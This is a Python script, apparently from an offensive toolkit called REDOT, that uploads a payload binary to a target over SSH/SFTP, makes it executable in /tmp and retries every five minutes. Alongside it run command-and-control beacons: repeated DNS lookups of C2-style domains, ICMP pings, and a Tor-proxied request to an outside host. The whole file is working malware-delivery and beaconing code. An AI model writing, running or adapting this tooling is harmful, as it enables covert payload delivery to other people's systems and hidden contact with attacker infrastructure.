#!/usr/bin/env python3
# REDOT: remote_agent_uploader.py
# Real remote agent uploader via SSH/SCP with beaconing and Tor fallback

import os
import time
import random
import socket
import subprocess
import threading
import paramiko
import requests

# === CONFIGURATION ===
DNS_DOMAINS = ["redot-upload.dns.c2", "stealth.upload.zone"]
ICMP_INTERVAL = 30
TOR_PROXY = "socks5h://127.0.0.1:9050"
FALLBACK_URL = "https://cdn.redot.live/agent_upload_status"
LOG_DIR = "logs/agent_upload"
LOG_FILE = os.path.join(LOG_DIR, "upload.log")
PAYLOAD_PATH = "payloads/agent.bin"  # Local payload to upload
TARGET_HOST = "192.168.1.100"        # Target hostname or IP
TARGET_PORT = 22                     # SSH port
TARGET_USER = "targetuser"           # SSH username
TARGET_UPLOAD_PATH = "/tmp/agent.bin" # Remote path for uploaded payload
SSH_KEY_PATH = "~/.ssh/id_rsa"       # Path to SSH private key

os.makedirs(LOG_DIR, exist_ok=True)

def log(msg):
    timestamp = time.strftime("%H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] {msg}\n")
    print(f"[{timestamp}] {msg}")

def dns_beacon_loop():
    while True:
        domain = random.choice(DNS_DOMAINS)
        try:
            socket.gethostbyname(domain)
            log(f"[DNS] Beaconed domain: {domain}")
        except Exception as e:
            log(f"[DNS] Failed to resolve {domain}: {e}")
        time.sleep(random.randint(20, 40))

def icmp_beacon_loop():
    while True:
        try:
            # Ping once (-c 1), suppress output
            subprocess.run(
                ["ping", "-c", "1", "8.8.8.8"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=True,
            )
            log("[ICMP] Sent ping to 8.8.8.8")
        except subprocess.CalledProcessError:
            log("[ICMP] Ping failed")
        time.sleep(ICMP_INTERVAL)

def tor_fallback():
    try:
        proxies = {"http": TOR_PROXY, "https": TOR_PROXY}
        r = requests.get(FALLBACK_URL, proxies=proxies, timeout=10)
        if r.status_code == 200:
            log("[TOR] Fallback communication successful")
        else:
            log(f"[TOR] Fallback HTTP error status: {r.status_code}")
    except Exception as e:
        log(f"[TOR] Fallback failed: {e}")

def upload_payload_ssh():
    """
    Upload payload to remote target via SSH using SCP (paramiko)
    """
    if not os.path.isfile(PAYLOAD_PATH):
        log(f"[UPLOAD] Payload file missing: {PAYLOAD_PATH}")
        return False

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Load private key
        key_path_expanded = os.path.expanduser(SSH_KEY_PATH)
        pkey = paramiko.RSAKey.from_private_key_file(key_path_expanded)
        log(f"[UPLOAD] Connecting to {TARGET_HOST}:{TARGET_PORT} as {TARGET_USER}")
        ssh.connect(TARGET_HOST, port=TARGET_PORT, username=TARGET_USER, pkey=pkey, timeout=15)
    except Exception as e:
        log(f"[UPLOAD] SSH connection failed: {e}")
        return False

    try:
        sftp = ssh.open_sftp()
        log(f"[UPLOAD] Starting SCP upload to {TARGET_UPLOAD_PATH}")
        sftp.put(PAYLOAD_PATH, TARGET_UPLOAD_PATH)
        sftp.chmod(TARGET_UPLOAD_PATH, 0o755)  # Ensure executable permission
        sftp.close()
        log("[UPLOAD] Upload succeeded")
    except Exception as e:
        log(f"[UPLOAD] Upload failed: {e}")
        ssh.close()
        return False

    ssh.close()
    return True

def upload_monitor_loop():
    while True:
        success = upload_payload_ssh()
        if success:
            log("[UPLOAD_MONITOR] Payload upload succeeded")
        else:
            log("[UPLOAD_MONITOR] Payload upload failed")
        time.sleep(300)  # Retry every 5 minutes

def orchestrate():
    threads = []
    threads.append(threading.Thread(target=dns_beacon_loop, daemon=True))
    threads.append(threading.Thread(target=icmp_beacon_loop, daemon=True))
    threads.append(threading.Thread(target=upload_monitor_loop, daemon=True))

    for t in threads:
        t.start()

    while True:
        tor_fallback()
        time.sleep(180)  # Every 3 minutes

def main():
    print("=== REDOT Remote Agent Uploader ===")
    orchestrate()

if __name__ == "__main__":
    main()
